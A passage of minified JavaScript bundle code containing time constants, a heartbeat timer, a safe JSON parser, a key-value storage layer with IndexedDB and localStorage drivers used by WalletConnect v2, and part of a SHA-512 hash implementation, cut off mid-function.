xH||(xH=1,Object.defineProperty(G0,"__esModule",{value:!0}),G0.ONE_THOUSAND=G0.ONE_HUNDRED=void 0,G0.ONE_HUNDRED=100,G0.ONE_THOUSAND=1e3),G0}var LN={},IH;function Y1e(){return IH||(IH=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),t.ONE_YEAR=t.FOUR_WEEKS=t.THREE_WEEKS=t.TWO_WEEKS=t.ONE_WEEK=t.THIRTY_DAYS=t.SEVEN_DAYS=t.FIVE_DAYS=t.THREE_DAYS=t.ONE_DAY=t.TWENTY_FOUR_HOURS=t.TWELVE_HOURS=t.SIX_HOURS=t.THREE_HOURS=t.ONE_HOUR=t.SIXTY_MINUTES=t.THIRTY_MINUTES=t.TEN_MINUTES=t.FIVE_MINUTES=t.ONE_MINUTE=t.SIXTY_SECONDS=t.THIRTY_SECONDS=t.TEN_SECONDS=t.FIVE_SECONDS=t.ONE_SECOND=void 0,t.ONE_SECOND=1,t.FIVE_SECONDS=5,t.TEN_SECONDS=10,t.THIRTY_SECONDS=30,t.SIXTY_SECONDS=60,t.ONE_MINUTE=t.SIXTY_SECONDS,t.FIVE_MINUTES=t.ONE_MINUTE*5,t.TEN_MINUTES=t.ONE_MINUTE*10,t.THIRTY_MINUTES=t.ONE_MINUTE*30,t.SIXTY_MINUTES=t.ONE_MINUTE*60,t.ONE_HOUR=t.SIXTY_MINUTES,t.THREE_HOURS=t.ONE_HOUR*3,t.SIX_HOURS=t.ONE_HOUR*6,t.TWELVE_HOURS=t.ONE_HOUR*12,t.TWENTY_FOUR_HOURS=t.ONE_HOUR*24,t.ONE_DAY=t.TWENTY_FOUR_HOURS,t.THREE_DAYS=t.ONE_DAY*3,t.FIVE_DAYS=t.ONE_DAY*5,t.SEVEN_DAYS=t.ONE_DAY*7,t.THIRTY_DAYS=t.ONE_DAY*30,t.ONE_WEEK=t.SEVEN_DAYS,t.TWO_WEEKS=t.ONE_WEEK*2,t.THREE_WEEKS=t.ONE_WEEK*3,t.FOUR_WEEKS=t.ONE_WEEK*4,t.ONE_YEAR=t.ONE_DAY*365})(LN)),LN}var RH;function Jre(){return RH||(RH=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=G_;e.__exportStar(Z1e(),t),e.__exportStar(Y1e(),t)})(UN)),UN}var PH;function Q1e(){if(PH)return W0;PH=1,Object.defineProperty(W0,"__esModule",{value:!0}),W0.fromMiliseconds=W0.toMiliseconds=void 0;const t=Jre();function e(r){return r*t.ONE_THOUSAND}W0.toMiliseconds=e;function n(r){return Math.floor(r/t.ONE_THOUSAND)}return W0.fromMiliseconds=n,W0}var NH;function J1e(){return NH||(NH=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=G_;e.__exportStar(K1e(),t),e.__exportStar(Q1e(),t)})(MN)),MN}var tb={},OH;function X1e(){if(OH)return tb;OH=1,Object.defineProperty(tb,"__esModule",{value:!0}),tb.Watch=void 0;class t{constructor(){this.timestamps=new Map}start(n){if(this.timestamps.has(n))throw new Error(`Watch already started for label: ${n}`);this.timestamps.set(n,{started:Date.now()})}stop(n){const r=this.get(n);if(typeof r.elapsed<"u")throw new Error(`Watch already stopped for label: ${n}`);const i=Date.now()-r.started;this.timestamps.set(n,{started:r.started,elapsed:i})}get(n){const r=this.timestamps.get(n);if(typeof r>"u")throw new Error(`No timestamp found for label: ${n}`);return r}elapsed(n){const r=this.get(n);return r.elapsed||Date.now()-r.started}}return tb.Watch=t,tb.default=t,tb}var FN={},vv={},kH;function ewe(){if(kH)return vv;kH=1,Object.defineProperty(vv,"__esModule",{value:!0}),vv.IWatch=void 0;class t{}return vv.IWatch=t,vv}var DH;function twe(){return DH||(DH=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0}),G_.__exportStar(ewe(),t)})(FN)),FN}var BH;function nwe(){return BH||(BH=1,(function(t){Object.defineProperty(t,"__esModule",{value:!0});const e=G_;e.__exportStar(J1e(),t),e.__exportStar(X1e(),t),e.__exportStar(twe(),t),e.__exportStar(Jre(),t)})(jN)),jN}var Ye=nwe();class Lg{}let rwe=class extends Lg{constructor(e){super()}};const jH=Ye.FIVE_SECONDS,Fg={pulse:"heartbeat_pulse"};let iwe=class Xre extends rwe{constructor(e){super(e),this.events=new Wc.EventEmitter,this.interval=jH,this.interval=e?.interval||jH}static async init(e){const n=new Xre(e);return await n.init(),n}async init(){await this.initialize()}stop(){clearInterval(this.intervalRef)}on(e,n){this.events.on(e,n)}once(e,n){this.events.once(e,n)}off(e,n){this.events.off(e,n)}removeListener(e,n){this.events.removeListener(e,n)}async initialize(){this.intervalRef=setInterval(()=>this.pulse(),Ye.toMiliseconds(this.interval))}pulse(){this.events.emit(Fg.pulse)}};const swe=/"(?:_|\\u0{2}5[Ff]){2}(?:p|\\u0{2}70)(?:r|\\u0{2}72)(?:o|\\u0{2}6[Ff])(?:t|\\u0{2}74)(?:o|\\u0{2}6[Ff])(?:_|\\u0{2}5[Ff]){2}"\s*:/,owe=/"(?:c|\\u0063)(?:o|\\u006[Ff])(?:n|\\u006[Ee])(?:s|\\u0073)(?:t|\\u0074)(?:r|\\u0072)(?:u|\\u0075)(?:c|\\u0063)(?:t|\\u0074)(?:o|\\u006[Ff])(?:r|\\u0072)"\s*:/,awe=/^\s*["[{]|^\s*-?\d{1,16}(\.\d{1,17})?([Ee][+-]?\d+)?\s*$/;function cwe(t,e){if(t==="__proto__"||t==="constructor"&&e&&typeof e=="object"&&"prototype"in e){uwe(t);return}return e}function uwe(t){console.warn(`[destr] Dropping "${t}" key to prevent prototype pollution.`)}function D3(t,e={}){if(typeof t!="string")return t;if(t[0]==='"'&&t[t.length-1]==='"'&&t.indexOf("\\")===-1)return t.slice(1,-1);const n=t.trim();if(n.length<=9)switch(n.toLowerCase()){case"true":return!0;case"false":return!1;case"undefined":return;case"null":return null;case"nan":return Number.NaN;case"infinity":return Number.POSITIVE_INFINITY;case"-infinity":return Number.NEGATIVE_INFINITY}if(!awe.test(t)){if(e.strict)throw new SyntaxError("[destr] Invalid JSON");return t}try{if(swe.test(t)||owe.test(t)){if(e.strict)throw new Error("[destr] Possible prototype pollution");return JSON.parse(t,cwe)}return JSON.parse(t)}catch(r){if(e.strict)throw r;return t}}function lwe(t){return!t||typeof t.then!="function"?Promise.resolve(t):t}function Zi(t,...e){try{return lwe(t(...e))}catch(n){return Promise.reject(n)}}function dwe(t){const e=typeof t;return t===null||e!=="object"&&e!=="function"}function fwe(t){const e=Object.getPrototypeOf(t);return!e||e.isPrototypeOf(Object)}function HT(t){if(dwe(t))return String(t);if(fwe(t)||Array.isArray(t))return JSON.stringify(t);if(typeof t.toJSON=="function")return HT(t.toJSON());throw new Error("[unstorage] Cannot stringify value!")}const zk="base64:";function hwe(t){return typeof t=="string"?t:zk+gwe(t)}function pwe(t){return typeof t!="string"||!t.startsWith(zk)?t:mwe(t.slice(zk.length))}function mwe(t){return globalThis.Buffer?Buffer.from(t,"base64"):Uint8Array.from(globalThis.atob(t),e=>e.codePointAt(0))}function gwe(t){return globalThis.Buffer?Buffer.from(t).toString("base64"):globalThis.btoa(String.fromCodePoint(...t))}function Vo(t){return t&&t.split("?")[0]?.replace(/[/\\]/g,":").replace(/:+/g,":").replace(/^:|:$/g,"")||""}function ywe(...t){return Vo(t.join(":"))}function B3(t){return t=Vo(t),t?t+":":""}function bwe(t,e){if(e===void 0)return!0;let n=0,r=t.indexOf(":");for(;r>-1;)n++,r=t.indexOf(":",r+1);return n<=e}function wwe(t,e){return e?t.startsWith(e)&&t[t.length-1]!=="$":t[t.length-1]!=="$"}const vwe="memory",Ewe=()=>{const t=new Map;return{name:vwe,getInstance:()=>t,hasItem(e){return t.has(e)},getItem(e){return t.get(e)??null},getItemRaw(e){return t.get(e)??null},setItem(e,n){t.set(e,n)},setItemRaw(e,n){t.set(e,n)},removeItem(e){t.delete(e)},getKeys(){return[...t.keys()]},clear(){t.clear()},dispose(){t.clear()}}};function _we(t={}){const e={mounts:{"":t.driver||Ewe()},mountpoints:[""],watching:!1,watchListeners:[],unwatch:{}},n=l=>{for(const f of e.mountpoints)if(l.startsWith(f))return{base:f,relativeKey:l.slice(f.length),driver:e.mounts[f]};return{base:"",relativeKey:l,driver:e.mounts[""]}},r=(l,f)=>e.mountpoints.filter(h=>h.startsWith(l)||f&&l.startsWith(h)).map(h=>({relativeBase:l.length>h.length?l.slice(h.length):void 0,mountpoint:h,driver:e.mounts[h]})),i=(l,f)=>{if(e.watching){f=Vo(f);for(const h of e.watchListeners)h(l,f)}},s=async()=>{if(!e.watching){e.watching=!0;for(const l in e.mounts)e.unwatch[l]=await MH(e.mounts[l],i,l)}},o=async()=>{if(e.watching){for(const l in e.unwatch)await e.unwatch[l]();e.unwatch={},e.watching=!1}},a=(l,f,h)=>{const m=new Map,b=w=>{let y=m.get(w.base);return y||(y={driver:w.driver,base:w.base,items:[]},m.set(w.base,y)),y};for(const w of l){const y=typeof w=="string",E=Vo(y?w:w.key),A=y?void 0:w.value,R=y||!w.options?f:{...f,...w.options},S=n(E);b(S).items.push({key:E,value:A,relativeKey:S.relativeKey,options:R})}return Promise.all([...m.values()].map(w=>h(w))).then(w=>w.flat())},c={hasItem(l,f={}){l=Vo(l);const{relativeKey:h,driver:m}=n(l);return Zi(m.hasItem,h,f)},getItem(l,f={}){l=Vo(l);const{relativeKey:h,driver:m}=n(l);return Zi(m.getItem,h,f).then(b=>D3(b))},getItems(l,f={}){return a(l,f,h=>h.driver.getItems?Zi(h.driver.getItems,h.items.map(m=>({key:m.relativeKey,options:m.options})),f).then(m=>m.map(b=>({key:ywe(h.base,b.key),value:D3(b.value)}))):Promise.all(h.items.map(m=>Zi(h.driver.getItem,m.relativeKey,m.options).then(b=>({key:m.key,value:D3(b)})))))},getItemRaw(l,f={}){l=Vo(l);const{relativeKey:h,driver:m}=n(l);return m.getItemRaw?Zi(m.getItemRaw,h,f):Zi(m.getItem,h,f).then(b=>pwe(b))},async setItem(l,f,h={}){if(f===void 0)return c.removeItem(l);l=Vo(l);const{relativeKey:m,driver:b}=n(l);b.setItem&&(await Zi(b.setItem,m,HT(f),h),b.watch||i("update",l))},async setItems(l,f){await a(l,f,async h=>{if(h.driver.setItems)return Zi(h.driver.setItems,h.items.map(m=>({key:m.relativeKey,value:HT(m.value),options:m.options})),f);h.driver.setItem&&await Promise.all(h.items.map(m=>Zi(h.driver.setItem,m.relativeKey,HT(m.value),m.options)))})},async setItemRaw(l,f,h={}){if(f===void 0)return c.removeItem(l,h);l=Vo(l);const{relativeKey:m,driver:b}=n(l);if(b.setItemRaw)await Zi(b.setItemRaw,m,f,h);else if(b.setItem)await Zi(b.setItem,m,hwe(f),h);else return;b.watch||i("update",l)},async removeItem(l,f={}){typeof f=="boolean"&&(f={removeMeta:f}),l=Vo(l);const{relativeKey:h,driver:m}=n(l);m.removeItem&&(await Zi(m.removeItem,h,f),(f.removeMeta||f.removeMata)&&await Zi(m.removeItem,h+"$",f),m.watch||i("remove",l))},async getMeta(l,f={}){typeof f=="boolean"&&(f={nativeOnly:f}),l=Vo(l);const{relativeKey:h,driver:m}=n(l),b=Object.create(null);if(m.getMeta&&Object.assign(b,await Zi(m.getMeta,h,f)),!f.nativeOnly){const w=await Zi(m.getItem,h+"$",f).then(y=>D3(y));w&&typeof w=="object"&&(typeof w.atime=="string"&&(w.atime=new Date(w.atime)),typeof w.mtime=="string"&&(w.mtime=new Date(w.mtime)),Object.assign(b,w))}return b},setMeta(l,f,h={}){return this.setItem(l+"$",f,h)},removeMeta(l,f={}){return this.removeItem(l+"$",f)},async getKeys(l,f={}){l=B3(l);const h=r(l,!0);let m=[];const b=[];let w=!0;for(const E of h){E.driver.flags?.maxDepth||(w=!1);const A=await Zi(E.driver.getKeys,E.relativeBase,f);for(const R of A){const S=E.mountpoint+Vo(R);m.some(v=>S.startsWith(v))||b.push(S)}m=[E.mountpoint,...m.filter(R=>!R.startsWith(E.mountpoint))]}const y=f.maxDepth!==void 0&&!w;return b.filter(E=>(!y||bwe(E,f.maxDepth))&&wwe(E,l))},async clear(l,f={}){l=B3(l),await Promise.all(r(l,!1).map(async h=>{if(h.driver.clear)return Zi(h.driver.clear,h.relativeBase,f);if(h.driver.removeItem){const m=await h.driver.getKeys(h.relativeBase||"",f);return Promise.all(m.map(b=>h.driver.removeItem(b,f)))}}))},async dispose(){await Promise.all(Object.values(e.mounts).map(l=>UH(l)))},async watch(l){return await s(),e.watchListeners.push(l),async()=>{e.watchListeners=e.watchListeners.filter(f=>f!==l),e.watchListeners.length===0&&await o()}},async unwatch(){e.watchListeners=[],await o()},mount(l,f){if(l=B3(l),l&&e.mounts[l])throw new Error(`already mounted at ${l}`);return l&&(e.mountpoints.push(l),e.mountpoints.sort((h,m)=>m.length-h.length)),e.mounts[l]=f,e.watching&&Promise.resolve(MH(f,i,l)).then(h=>{e.unwatch[l]=h}).catch(console.error),c},async unmount(l,f=!0){l=B3(l),!(!l||!e.mounts[l])&&(e.watching&&l in e.unwatch&&(e.unwatch[l]?.(),delete e.unwatch[l]),f&&await UH(e.mounts[l]),e.mountpoints=e.mountpoints.filter(h=>h!==l),delete e.mounts[l])},getMount(l=""){l=Vo(l)+":";const f=n(l);return{driver:f.driver,base:f.base}},getMounts(l="",f={}){return l=Vo(l),r(l,f.parents).map(m=>({driver:m.driver,base:m.mountpoint}))},keys:(l,f={})=>c.getKeys(l,f),get:(l,f={})=>c.getItem(l,f),set:(l,f,h={})=>c.setItem(l,f,h),has:(l,f={})=>c.hasItem(l,f),del:(l,f={})=>c.removeItem(l,f),remove:(l,f={})=>c.removeItem(l,f)};return c}function MH(t,e,n){return t.watch?t.watch((r,i)=>e(r,n+i)):()=>{}}async function UH(t){typeof t.dispose=="function"&&await Zi(t.dispose)}function $g(t){return new Promise((e,n)=>{t.oncomplete=t.onsuccess=()=>e(t.result),t.onabort=t.onerror=()=>n(t.error)})}function eie(t,e){const n=indexedDB.open(t);n.onupgradeneeded=()=>n.result.createObjectStore(e);const r=$g(n);return(i,s)=>r.then(o=>s(o.transaction(e,i).objectStore(e)))}let $N;function K_(){return $N||($N=eie("keyval-store","keyval")),$N}function LH(t,e=K_()){return e("readonly",n=>$g(n.get(t)))}function Awe(t,e,n=K_()){return n("readwrite",r=>(r.put(e,t),$g(r.transaction)))}function Cwe(t,e=K_()){return e("readwrite",n=>(n.delete(t),$g(n.transaction)))}function Swe(t=K_()){return t("readwrite",e=>(e.clear(),$g(e.transaction)))}function Twe(t,e){return t.openCursor().onsuccess=function(){this.result&&(e(this.result),this.result.continue())},$g(t.transaction)}function xwe(t=K_()){return t("readonly",e=>{if(e.getAllKeys)return $g(e.getAllKeys());const n=[];return Twe(e,r=>n.push(r.key)).then(()=>n)})}const Iwe="idb-keyval";var Rwe=(t={})=>{const e=t.base&&t.base.length>0?`${t.base}:`:"",n=i=>e+i;let r;return t.dbName&&t.storeName&&(r=eie(t.dbName,t.storeName)),{name:Iwe,options:t,async hasItem(i){return!(typeof await LH(n(i),r)>"u")},async getItem(i){return await LH(n(i),r)??null},setItem(i,s){return Awe(n(i),s,r)},removeItem(i){return Cwe(n(i),r)},getKeys(){return xwe(r)},clear(){return Swe(r)}}};const Pwe="WALLET_CONNECT_V2_INDEXED_DB",Nwe="keyvaluestorage";let Owe=class{constructor(){this.indexedDb=_we({driver:Rwe({dbName:Pwe,storeName:Nwe})})}async getKeys(){return this.indexedDb.getKeys()}async getEntries(){return(await this.indexedDb.getItems(await this.indexedDb.getKeys())).map(e=>[e.key,e.value])}async getItem(e){const n=await this.indexedDb.getItem(e);if(n!==null)return n}async setItem(e,n){await this.indexedDb.setItem(e,Rf(n))}async removeItem(e){await this.indexedDb.removeItem(e)}};var HN=typeof globalThis<"u"?globalThis:typeof window<"u"?window:typeof global<"u"?global:typeof self<"u"?self:{},zT={exports:{}};(function(){let t;function e(){}t=e,t.prototype.getItem=function(n){return this.hasOwnProperty(n)?String(this[n]):null},t.prototype.setItem=function(n,r){this[n]=String(r)},t.prototype.removeItem=function(n){delete this[n]},t.prototype.clear=function(){const n=this;Object.keys(n).forEach(function(r){n[r]=void 0,delete n[r]})},t.prototype.key=function(n){return n=n||0,Object.keys(this)[n]},t.prototype.__defineGetter__("length",function(){return Object.keys(this).length}),typeof HN<"u"&&HN.localStorage?zT.exports=HN.localStorage:typeof window<"u"&&window.localStorage?zT.exports=window.localStorage:zT.exports=new e})();function kwe(t){var e;return[t[0],sg((e=t[1])!=null?e:"")]}let Dwe=class{constructor(){this.localStorage=zT.exports}async getKeys(){return Object.keys(this.localStorage)}async getEntries(){return Object.entries(this.localStorage).map(kwe)}async getItem(e){const n=this.localStorage.getItem(e);if(n!==null)return sg(n)}async setItem(e,n){this.localStorage.setItem(e,Rf(n))}async removeItem(e){this.localStorage.removeItem(e)}};const Bwe="wc_storage_version",FH=1,jwe=async(t,e,n)=>{const r=Bwe,i=await e.getItem(r);if(i&&i>=FH){n(e);return}const s=await t.getKeys();if(!s.length){n(e);return}const o=[];for(;s.length;){const a=s.shift();if(!a)continue;const c=a.toLowerCase();if(c.includes("wc@")||c.includes("walletconnect")||c.includes("wc_")||c.includes("wallet_connect")){const l=await t.getItem(a);await e.setItem(a,l),o.push(a)}}await e.setItem(r,FH),n(e),Mwe(t,o)},Mwe=async(t,e)=>{e.length&&e.forEach(async n=>{await t.removeItem(n)})};let Uwe=class{constructor(){this.initialized=!1,this.setInitialized=n=>{this.storage=n,this.initialized=!0};const e=new Dwe;this.storage=e;try{const n=new Owe;jwe(e,n,this.setInitialized)}catch{this.initialized=!0}}async getKeys(){return await this.initialize(),this.storage.getKeys()}async getEntries(){return await this.initialize(),this.storage.getEntries()}async getItem(e){return await this.initialize(),this.storage.getItem(e)}async setItem(e,n){return await this.initialize(),this.storage.setItem(e,n)}async removeItem(e){return await this.initialize(),this.storage.removeItem(e)}async initialize(){this.initialized||await new Promise(e=>{const n=setInterval(()=>{this.initialized&&(clearInterval(n),e())},20)})}};var Lwe=Object.defineProperty,Fwe=(t,e,n)=>e in t?Lwe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,$H=(t,e,n)=>Fwe(t,typeof e!="symbol"?e+"":e,n);let $we=class extends Lg{constructor(e){super(),this.opts=e,$H(this,"protocol","wc"),$H(this,"version",2)}};var Hwe=Object.defineProperty,zwe=(t,e,n)=>e in t?Hwe(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,qwe=(t,e,n)=>zwe(t,e+"",n);let Vwe=class extends Lg{constructor(e,n){super(),this.core=e,this.logger=n,qwe(this,"records",new Map)}},Wwe=class{constructor(e,n){this.logger=e,this.core=n}},Gwe=class extends Lg{constructor(e,n){super(),this.relayer=e,this.logger=n}},Kwe=class extends Lg{constructor(e){super()}},Zwe=class{constructor(e,n,r,i){this.core=e,this.logger=n,this.name=r}},Ywe=class extends Lg{constructor(e,n){super(),this.relayer=e,this.logger=n}},Qwe=class extends Lg{constructor(e,n){super(),this.core=e,this.logger=n}},Jwe=class{constructor(e,n,r){this.core=e,this.logger=n,this.store=r}},Xwe=class{constructor(e,n){this.projectId=e,this.logger=n}},eve=class{constructor(e,n,r){this.core=e,this.logger=n,this.telemetryEnabled=r}};var tve=Object.defineProperty,nve=(t,e,n)=>e in t?tve(t,e,{enumerable:!0,configurable:!0,writable:!0,value:n}):t[e]=n,HH=(t,e,n)=>nve(t,typeof e!="symbol"?e+"":e,n);let rve=class{constructor(e){this.opts=e,HH(this,"protocol","wc"),HH(this,"version",2)}},ive=class{constructor(e){this.client=e}};function sve(t){return t instanceof Uint8Array||ArrayBuffer.isView(t)&&t.constructor.name==="Uint8Array"}function tie(t,...e){if(!sve(t))throw new Error("Uint8Array expected");if(e.length>0&&!e.includes(t.length))throw new Error("Uint8Array expected of length "+e+", got length="+t.length)}function zH(t,e=!0){if(t.destroyed)throw new Error("Hash instance has been destroyed");if(e&&t.finished)throw new Error("Hash#digest() has already been called")}function ove(t,e){tie(t);const n=e.outputLen;if(t.length<n)throw new Error("digestInto() expects output buffer of length at least "+n)}const nb=typeof globalThis=="object"&&"crypto"in globalThis?globalThis.crypto:void 0;const zN=t=>new DataView(t.buffer,t.byteOffset,t.byteLength);function ave(t){if(typeof t!="string")throw new Error("utf8ToBytes expected string, got "+typeof t);return new Uint8Array(new TextEncoder().encode(t))}function nie(t){return typeof t=="string"&&(t=ave(t)),tie(t),t}let cve=class{clone(){return this._cloneInto()}};function uve(t){const e=r=>t().update(nie(r)).digest(),n=t();return e.outputLen=n.outputLen,e.blockLen=n.blockLen,e.create=()=>t(),e}function rie(t=32){if(nb&&typeof nb.getRandomValues=="function")return nb.getRandomValues(new Uint8Array(t));if(nb&&typeof nb.randomBytes=="function")return nb.randomBytes(t);throw new Error("crypto.getRandomValues must be defined")}function lve(t,e,n,r){if(typeof t.setBigUint64=="function")return t.setBigUint64(e,n,r);const i=BigInt(32),s=BigInt(4294967295),o=Number(n>>i&s),a=Number(n&s),c=r?4:0,l=r?0:4;t.setUint32(e+c,o,r),t.setUint32(e+l,a,r)}let dve=class extends cve{constructor(e,n,r,i){super(),this.blockLen=e,this.outputLen=n,this.padOffset=r,this.isLE=i,this.finished=!1,this.length=0,this.pos=0,this.destroyed=!1,this.buffer=new Uint8Array(e),this.view=zN(this.buffer)}update(e){zH(this);const{view:n,buffer:r,blockLen:i}=this;e=nie(e);const s=e.length;for(let o=0;o<s;){const a=Math.min(i-this.pos,s-o);if(a===i){const c=zN(e);for(;i<=s-o;o+=i)this.process(c,o);continue}r.set(e.subarray(o,o+a),this.pos),this.pos+=a,o+=a,this.pos===i&&(this.process(n,0),this.pos=0)}return this.length+=e.length,this.roundClean(),this}digestInto(e){zH(this),ove(e,this),this.finished=!0;const{buffer:n,view:r,blockLen:i,isLE:s}=this;let{pos:o}=this;n[o++]=128,this.buffer.subarray(o).fill(0),this.padOffset>i-o&&(this.process(r,0),o=0);for(let h=o;h<i;h++)n[h]=0;lve(r,i-8,BigInt(this.length*8),s),this.process(r,0);const a=zN(e),c=this.outputLen;if(c%4)throw new Error("_sha2: outputLen should be aligned to 32bit");const l=c/4,f=this.get();if(l>f.length)throw new Error("_sha2: outputLen bigger than state");for(let h=0;h<l;h++)a.setUint32(4*h,f[h],s)}digest(){const{buffer:e,outputLen:n}=this;this.digestInto(e);const r=e.slice(0,n);return this.destroy(),r}_cloneInto(e){e||(e=new this.constructor),e.set(...this.get());const{blockLen:n,buffer:r,length:i,finished:s,destroyed:o,pos:a}=this;return e.length=i,e.pos=a,e.finished=s,e.destroyed=o,i%n&&e.buffer.set(r),e}};const j3=BigInt(2**32-1),qk=BigInt(32);function iie(t,e=!1){return e?{h:Number(t&j3),l:Number(t>>qk&j3)}:{h:Number(t>>qk&j3)|0,l:Number(t&j3)|0}}function fve(t,e=!1){let n=new Uint32Array(t.length),r=new Uint32Array(t.length);for(let i=0;i<t.length;i++){const{h:s,l:o}=iie(t[i],e);[n[i],r[i]]=[s,o]}return[n,r]}const hve=(t,e)=>BigInt(t>>>0)<<qk|BigInt(e>>>0),pve=(t,e,n)=>t>>>n,mve=(t,e,n)=>t<<32-n|e>>>n,gve=(t,e,n)=>t>>>n|e<<32-n,yve=(t,e,n)=>t<<32-n|e>>>n,bve=(t,e,n)=>t<<64-n|e>>>n-32,wve=(t,e,n)=>t>>>n-32|e<<64-n,vve=(t,e)=>e,Eve=(t,e)=>t,_ve=(t,e,n)=>t<<n|e>>>32-n,Ave=(t,e,n)=>e<<n|t>>>32-n,Cve=(t,e,n)=>e<<n-32|t>>>64-n,Sve=(t,e,n)=>t<<n-32|e>>>64-n;function Tve(t,e,n,r){const i=(e>>>0)+(r>>>0);return{h:t+n+(i/2**32|0)|0,l:i|0}}const xve=(t,e,n)=>(t>>>0)+(e>>>0)+(n>>>0),Ive=(t,e,n,r)=>e+n+r+(t/2**32|0)|0,Rve=(t,e,n,r)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0),Pve=(t,e,n,r,i)=>e+n+r+i+(t/2**32|0)|0,Nve=(t,e,n,r,i)=>(t>>>0)+(e>>>0)+(n>>>0)+(r>>>0)+(i>>>0),Ove=(t,e,n,r,i,s)=>e+n+r+i+s+(t/2**32|0)|0,tn={fromBig:iie,split:fve,toBig:hve,shrSH:pve,shrSL:mve,rotrSH:gve,rotrSL:yve,rotrBH:bve,rotrBL:wve,rotr32H:vve,rotr32L:Eve,rotlSH:_ve,rotlSL:Ave,rotlBH:Cve,rotlBL:Sve,add:Tve,add3L:xve,add3H:Ive,add4L:Rve,add4H:Pve,add5H:Ove,add5L:Nve},[kve,Dve]=tn.split(["0x428a2f98d728ae22","0x7137449123ef65cd","0xb5c0fbcfec4d3b2f","0xe9b5dba58189dbbc","0x3956c25bf348b538","0x59f111f1b605d019","0x923f82a4af194f9b","0xab1c5ed5da6d8118","0xd807aa98a3030242","0x12835b0145706fbe","0x243185be4ee4b28c","0x550c7dc3d5ffb4e2","0x72be5d74f27b896f","0x80deb1fe3b1696b1","0x9bdc06a725c71235","0xc19bf174cf692694","0xe49b69c19ef14ad2","0xefbe4786384f25e3","0x0fc19dc68b8cd5b5","0x240ca1cc77ac9c65","0x2de92c6f592b0275","0x4a7484aa6ea6e483","0x5cb0a9dcbd41fbd4","0x76f988da831153b5","0x983e5152ee66dfab","0xa831c66d2db43210","0xb00327c898fb213f","0xbf597fc7beef0ee4","0xc6e00bf33da88fc2","0xd5a79147930aa725","0x06ca6351e003826f","0x142929670a0e6e70","0x27b70a8546d22ffc","0x2e1b21385c26c926","0x4d2c6dfc5ac42aed","0x53380d139d95b3df","0x650a73548baf63de","0x766a0abb3c77b2a8","0x81c2c92e47edaee6","0x92722c851482353b","0xa2bfe8a14cf10364","0xa81a664bbc423001","0xc24b8b70d0f89791","0xc76c51a30654be30","0xd192e819d6ef5218","0xd69906245565a910","0xf40e35855771202a","0x106aa07032bbd1b8","0x19a4c116b8d2d0c8","0x1e376c085141ab53","0x2748774cdf8eeb99","0x34b0bcb5e19b48a8","0x391c0cb3c5c95a63","0x4ed8aa4ae3418acb","0x5b9cca4f7763e373","0x682e6ff3d6b2b8a3","0x748f82ee5defb2fc","0x78a5636f43172f60","0x84c87814a1f0ab72","0x8cc702081a6439ec","0x90befffa23631e28","0xa4506cebde82bde9","0xbef9a3f7b2c67915","0xc67178f2e372532b","0xca273eceea26619c","0xd186b8c721c0c207","0xeada7dd6cde0eb1e","0xf57d4f7fee6ed178","0x06f067aa72176fba","0x0a637dc5a2c898a6","0x113f9804bef90dae","0x1b710b35131c471b","0x28db77f523047d84","0x32caab7b40c72493","0x3c9ebe0a15c9bebc","0x431d67c49c100d4c","0x4cc5d4becb3e42b6","0x597f299cfc657e2a","0x5fcb6fab3ad6faec","0x6c44198c4a475817"].map(t=>BigInt(t))),Uh=new Uint32Array(80),Lh=new Uint32Array(80);let Bve=class extends dve{constructor(){super(128,64,16,!1),this.Ah=1779033703,this.Al=-205731576,this.Bh=-1150833019,this.Bl=-2067093701,this.Ch=1013904242,this.Cl=-23791573,this.Dh=-1521486534,this.Dl=1595750129,this.Eh=1359893119,this.El=-1377402159,this.Fh=-1694144372,this.Fl=725511199,this.Gh=528734635,this.Gl=-79577749,this.Hh=1541459225,this.Hl=327033209}get(){const{Ah:e,Al:n,Bh:r,Bl:i,Ch:s,Cl:o,Dh:a,Dl:c,Eh:l,El:f,Fh:h,Fl:m,Gh:b,Gl:w,Hh:y,Hl:E}=this;return[e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E]}set(e,n,r,i,s,o,a,c,l,f,h,m,b,w,y,E){this.Ah=e|0,this.Al=n|0,this.Bh=r|0,this.Bl=i|0,this.Ch=s|0,this.Cl=o|0,this.Dh=a|0,this.Dl=c|0,this.Eh=l|0,this.El=f|0,this.Fh=h|0,this.Fl=m|0,this.Gh=b|0,this.Gl=w|0,this.Hh=y|0,this.Hl=E|0}process(e,n){for(let S=0;S<16;S++,n+=4)Uh[S]=e.getUint32(n),Lh[S]=e.getUint32(n+=4);for(let S=16;S<80;S++){const v=Uh[S-15]|0,k=Lh[S-15]|0,O=tn.rotrSH(v,k,1)^tn.rotrSH(v,k,8)^tn.shrSH(v,k,7),_=tn.rotrSL(v,k,1)^tn.rotrSL(v,k,8)^tn.shrSL(v,k,7),I=Uh[S-2]|0,T=Lh[S-2]|0,B=tn.rotrSH(I,T,19)^tn.rotrBH(I,T,61)^tn.shrSH(I,T,6),U=tn.rotrSL(I,T,19)^tn.rotrBL(I,T,61)^tn.shrSL(I,T,6),M=tn.add4L(_,U,Lh[S-7],Lh[S-16]),N=tn.add4H(M,O,B,Uh[S-7],Uh[S-16]);Uh[S]=N|0,Lh[S]=M|0}let{Ah:r,Al:i,Bh:s,Bl:o,Ch:a,Cl:c,Dh:l,Dl:f,Eh:h,El:m,Fh:b,Fl:w,Gh:y,Gl:E,Hh:A,Hl:R}=this;for(let S=0;S<80;S++){const 